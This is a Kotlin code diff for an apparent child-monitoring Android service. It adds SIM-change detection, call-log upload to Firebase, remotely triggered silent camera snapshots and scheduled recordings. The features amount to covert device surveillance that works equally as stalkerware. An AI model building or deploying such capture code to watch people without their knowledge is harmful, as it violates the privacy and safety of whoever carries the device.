@@ -401,6 +401,49 @@ class ChildForegroundService : Service() {
             }
         }
 
+        // SIM Change Detection (Phase 2)
+        com.example.authapp.security.SimChangeDetector.checkSimChange(applicationContext, uid)
+
+        // Sync Call Logs (Phase 2)
+        try {
+            val callLogs = com.example.authapp.utils.CallLogUtils.getRecentCallLogs(applicationContext, limit = 30)
+            if (callLogs.isNotEmpty()) {
+                FirebaseRepository.syncCallLogs(uid, callLogs)
+            }
+        } catch (_: Exception) {}
+
+        // Listen for Remote Snapshot requests (Phase 1)
+        FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
+            val isFront = cameraFacing.equals("front", ignoreCase = true)
+            com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
+                isFront = isFront,
+                onCaptured = { file ->
+                    FirebaseRepository.uploadSnapshot(
+                        childId = uid,
+                        fileUri = Uri.fromFile(file),
+                        cameraFacing = cameraFacing,
+                        onSuccess = {
+                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
+                            try { file.delete() } catch (_: Exception) {}
+                        },
+                        onFailure = { err ->
+                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
+                        }
+                    )
+                },
+                onError = { err ->
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
+                }
+            )
+        }
+
+        // Listen for Recording Schedules (Phase 1)
+        FirebaseRepository.listenToRecordingSchedules(uid) { schedules ->
+            for (schedule in schedules) {
+                com.example.authapp.scheduler.RecordingScheduler.setSchedule(applicationContext, schedule)
+            }
+        }
+
         if (streamRequestListener != null) return
 
         FirebaseCrashlytics.getInstance().log("[ChildService] Listening to RTDB stream requests for: $uid")
